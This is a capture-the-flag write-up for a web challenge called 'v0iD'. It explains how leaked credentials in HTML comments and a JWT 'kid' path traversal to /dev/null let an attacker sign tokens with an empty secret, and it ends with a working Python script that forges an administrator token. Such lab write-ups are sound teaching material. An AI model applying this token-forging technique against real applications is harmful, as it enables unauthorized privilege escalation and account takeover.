v0iD – Web Challenge

Author: NxStrip

Category: Web

Objective: Exploit a JWT kid Path Traversal vulnerability to forge a session token with administrator privileges and capture the flag.

1. Reconnaissance & Initial Access

Navigating to the target URL presents an "AUTHENTICATION PORTAL" requiring a Crew ID and Access Code. Inspecting the HTML source reveals two hidden developer comments. Decoding the Base64 string in the first yields a troll message, but the second comment provides valid test credentials.

Logging in with pilot_001 / S3cret_P1lot_Ag3nt grants access to the CREW PROFILE dashboard with standard "CREW" clearance.

2. Session Analysis

Intercepting authenticated requests to /my-account or /bridge reveals that session management is handled via a JSON Web Token (JWT) stored in the session cookie. Decoding it reveals: 

// Header
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "galactic-key.key"
}

// Payload
{
  "sub": "pilot_001",
  "role": "crew",
  "iat": 1772191301
}

The kid (Key ID) parameter pointing to a specific file strongly indicates a potential Path Traversal vulnerability.

3. Exploiting kid Path Traversal

The server uses the file specified in kid as the HS256 secret key. Because this input is not sanitised, we can use directory traversal (../) to point the application to a known system file.

In Linux, /dev/null is an empty file. Setting kid to point there means the server will use an empty string as the secret to verify the token — a secret we fully control. 

// Malicious Header
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../../../../../dev/null"
}

4. Privilege Escalation & Forging the Token

With the ability to sign our own tokens, we escalate privileges. Changing only the "role" field updates the UI but does not unlock the flag — the server strictly checks the user identity. Both "sub" and "role" must be set to administrator.

Standard tools like jwt.io struggle with completely empty secrets, so we use a Python script: 

import jwt

empty_secret = ""  # matches the contents of /dev/null

header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../../../../../../../../../dev/null"
}

payload = {
    "sub": "administrator",
    "role": "administrator",
    "iat": 1772193472
}

forged_token = jwt.encode(payload, empty_secret, algorithm="HS256", headers=header)
print(forged_token)
